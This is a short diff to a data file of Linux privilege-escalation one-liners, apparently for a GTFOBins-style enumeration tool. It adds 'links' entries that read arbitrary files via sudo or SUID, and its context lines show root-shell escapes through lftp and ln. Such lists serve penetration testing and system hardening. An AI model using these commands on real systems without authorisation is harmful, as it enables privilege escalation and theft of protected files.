@@ -956,6 +956,11 @@ sudo_bins = {
             "code": "sudo lftp -c '!/bin/sh'"
         }
     ],
+    "links": [
+        {
+            "code": "LFILE=file_to_read\nsudo links \"$LFILE\"\n"
+        }
+    ],
     "ln": [
         {
             "code": "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
@@ -2610,6 +2615,11 @@ suid_bins = {
     "less": [
         {
             "code": "./less file_to_read"
+        }
+    ],
+    "links": [
+        {
+            "code": "LFILE=file_to_read\n./links \"$LFILE\"\n"
         }
     ],
     "logsave": [
